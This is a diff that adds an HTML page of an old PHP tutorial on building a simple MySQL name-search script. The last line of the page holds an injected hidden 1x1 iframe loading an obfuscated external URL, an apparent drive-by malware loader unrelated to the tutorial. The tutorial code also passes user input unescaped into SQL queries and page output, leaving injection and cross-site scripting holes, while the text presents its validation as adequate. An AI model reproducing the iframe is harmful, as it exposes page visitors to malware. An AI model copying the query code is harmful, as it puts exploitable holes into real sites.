@@ -1,0 +1,228 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<title>Creating A Simple Search Engine In PHP </title>
+	
+	<meta http-equiv="Content-Type" content="text/html charset=utf-8" />
+	<meta content="Copyright 2001 SpiderMan" name="Copyright" />
+	<meta content="SpiderMan" name="Author" />
+	<meta content="English" name="Language" />
+	
+	<style type="text/css">
+	<!--
+		body {font: 12px Verdana, Arial, Helvetica, sans-serif}
+	
+		table.example {width: 350px; font-size: 12px; text-align:left}
+		tr.exampletop {background-color: #EBEBEB}
+
+		pre.example {background-color: #EBEBEB; border: 1px solid #000000; padding: 3px; text-align: left; width: 620px; margin-left: auto; margin-right: auto}
+	
+		p {text-align: left;}
+		p.para {text-indent: 12px}
+	
+		div.lastupdate {text-align: right}
+		/* hack so IE will center my stuff since it doesn't recognize margin: auto */
+		div.center {text-align: center}
+	
+		a:link {text-decoration: underline; color: #003F7F}
+		a:visited {text-decoration: underline; color: #003F7F}
+		a:hover {text-decoration: underline; color: #CC0000}
+
+		h2 {font-size: 12px}
+		h1.title {font-weight: normal; text-align: center; font-size: 12px}
+	-->
+	</style>
+</head>
+
+<body>
+	<h1 class="title">
+		<strong>Creating A Simple Search Engine In PHP (ver. 1.0.0)</strong>
+		<br />
+		by: <a href="mailto:spiderman@witty.com">SpiderMan</A> of <a href="http://blacksun.box.sk">Black Sun Research Facility </a>
+	</h1>
+	<h2>Introduction:</h2>
+	<p class="para">
+		This is the first in what I hope will be a long list of tutorials that I like to call Practical Programming in PHP. Lets get down to business, today I'm going to show you how to create a simple search engine that you can use for your very own site or some other project that you may be working on. For this tutorial I will be using a MySQL database. The bulk of the code should be compatible with PHP 3 and 4.
+	</p>
+	<h2>Background:</h2>
+	<p class="para">
+		Before we begin, I'll show you the table I'll be using in the examples:
+	</p>
+	<table class="example" align="center" border="1" cellspacing="0" cellpadding="2" summary="Table layout of database">
+		<tr class="exampletop">
+	    		<td>First_Name</td>
+			<td>Middle_Name</td>
+			<td>Last_Name</td>
+		</tr>
+		<tr>
+			<td>Dana</td>
+			<td>Johnson</td>
+			<td>Smith</td>
+		</tr>
+		<tr>
+			<td>Jill</td>
+			<td>Angel</td>
+			<td>Petersburg</td>
+		</tr>
+		<tr>
+			<td>Jack</td>
+			<td>Coner</td>
+			<td>Mitchel</td>
+		</tr>
+	</table>
+	<p class="para">
+		If you feel confused about any of the functions in the tutorial, have a look at my previous tutorial that deals with common database functions.
+	</p>
+	<h2>Down To Work:</h2>
+	<p class="para">
+		Before we actually make the search engine, we need to create a basic webpage that will have an input field where the user can enter his or her search query. I'm going to keep mine simple; feel free to make an elaborate one with lots of bells and whistles. The code for my page is below:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Simple Search Engine version 1.0&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;center&gt;
+    Enter the first, last, or middle name of the person you are looking for:
+    &lt;form action="search.php" method="post"&gt;
+      &lt;input type="text" name="search_query" maxlength="25" size="15"&gt;&lt;br&gt;
+      &lt;input type="reset" name="reset" value="Reset"&gt; 
+      &lt;input type="text" name="submit" value="Submit"&gt;
+    &lt;/form&gt;
+  &lt;/center&gt; 
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+	</div>
+	<p>
+		It's a pretty basic page so I'm not going to explain alot of it. Basically, the user will enter the first, middle, or last name of the person they are looking for and hit enter. The contents of the input field will be passed to a php script named &#8220;search.php&#8221; which will handle the rest.
+	</p>
+	<p class="para">
+		Now that the page is out of the way, let's create the actual script. First, we need to connect to the database using mysql_pconnect() and select the table using mysql_select_db(). Next, we want to parse the value passed to the script to see if it contains any invalid input, such as numbers and funky characters like #&*^. You should always validate input, don't rely on things like JavaScript to do it for  you, because once the user disables JavaScript all that fancy validation goes down the toilet. To check the input we are going to use a regular expression, they are a bit confusing and will be explained in a later tutorial. For now, all you need to know is that it will check to see if value passed is a string of characters. All right, enough chatter, here is the first part of the script:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?php 
+  mysql_pconnect("host", "username", "password") or die("Can't connect!");
+  mysql_select_db("Names") or die("Can't select database!"); 
+          
+  if (!eregi("[[:alpha:]]", $search_query))
+  {
+    echo "Error: you have entered an invalid query, you can only use characters!&lt;br&gt;";
+    exit;
+  }
+</pre>
+	</div>
+	<p>
+		Now that we've done that, we will form the search query.
+	</p>
+	<div class="center">
+		<pre class="example">
+$query= mysql_query("SELECT * FROM some_table WHERE First_Name= '$search_query' 
+OR Middle_Name= '$search_query' OR Last_Name= '$search_query' ORDER BY Last_Name");
+</pre>
+	</div>
+	<p>
+		Look confusing? I'll explain, what's happening is, we're asking MySQL to search all the rows in First_Name, Middle_Name, and Last_Name for a match to the query entered by the user; then, take the results of that search, alphabetize the results by Last_Name.
+	</p>
+	<p class="para">
+		The rest of the coding from now on is a breeze. We will get the results from the query using mysql_fetch_array( ), and check to see if there is a match using mysql_num_rows(). If there is a match, or matches, we will output it along with the number of matches found; if there isn't, we'll report to the user that we couldn't find anything.
+	</p>
+	<div class="center">
+		<pre class="example">
+  $result= mysql_num_rows($query);
+      
+  if ($result == 0)
+  {
+    echo "Sorry, I couldn't find any user that matches your query ($search_query)";
+    exit; 
+  }
+  else if ($result == 1)
+  {
+    echo "I've found &lt;b&gt;1&lt;/b&gt; match!&lt;br&gt;";
+  }
+  else {
+    echo "I've found &lt;b&gt;$result&lt;/b&gt; matches! &lt;br&gt;";
+  }
+      
+  while ($row= mysql_fetch_array($query))
+  {
+    $first_name= $row["First_Name"];
+    $middle_name = $row["Middle_Name"];
+    $last_name = $row["Last_Name"];
+        
+    echo "The first name of the user is: $first_name.&lt;br&gt;";
+    echo "The middle name of the user is: $middle_name.&lt;br&gt;";
+    echo "The last name of the user is: $last_name.&lt;br&gt;";
+  }
+?&gt;
+</pre>
+	</div>
+	<p>
+		I added that extra if statement so that when we report how many users we've found, its output will be in proper English. If I we don't, the script will echo "I've found 1 matches" which obviously isn't good grammar :P The rest of the script loops through the results and prints them to a webpage. That's all, we've finished the script! The entire script is included below:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title>Simple Search Engine version 1.0 - Results &lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt; 
+&lt;?php 
+  mysql_pconnect("host", "username", "password") or die("Can't connect!");
+  mysql_select_db("Names") or die("Can't select database!"); 
+      
+  if (!eregi("[[:alpha:]]", $search_query))
+  {
+    echo "Error: you have entered an invalid query, you can only use characters!&lt;br&gt;";
+    exit; //No need to execute the rest of the script.
+  }
+
+  $query= mysql_query("SELECT * FROM some_table WHERE First_Name='$search_query' 
+  OR Middle_Name= '$search_query' OR Last_Name='$search_query' ORDER BY Last_Name");
+
+  $result= mysql_numrows($query);
+      
+  if ($result == 0)
+  {
+    echo "Sorry, I couldn't find any user that matches your query ($search_query)";
+    exit; //No results found, why bother executing the rest of the script?
+  }
+  else if ($result == 1)
+  {
+    echo "I've found &lt;b&gt;1&lt;/b&gt; match!&lt;br&gt;";
+  }
+  else {
+    echo "I've found &lt;b&gt;$result&lt;/b&gt; matches!&lt;br&gt;";
+  }
+
+  while ($row= mysql_fetch_array($query))
+  {
+    $first_name= $row["First_Name"];
+    $middle_name = $row["Middle_Name"];
+    $last_name = $row["Last_Name"];
+          
+    echo "The first name of the user is: $first_name.&lt;br&gt;";
+    echo "The middle name of the user is: $middle_name.&lt;br&gt;";
+    echo "The last name of the user is: $last_name. &lt;br&gt;";
+  }
+?&gt; 
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+	</div>
+	<h2>Conclusion:</h2>
+	<p class="para">
+		Well that wraps up part 1 of the Practical Programming series. The 
+		pages I create were extremely simple because the focus was on the script. You 
+		should jazz up your pages with images and other cool effects. If you found any 
+		errors, or have any comments, please e-mail me (<a href="mailto:spiderman@witty.com" title="Click to e-mail me.">spiderman@witty.com</a>), kindly direct questions to the message board.
+	</p>
+	<div class="lastupdate">Last updated: <strong>2/23/01</strong></div>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
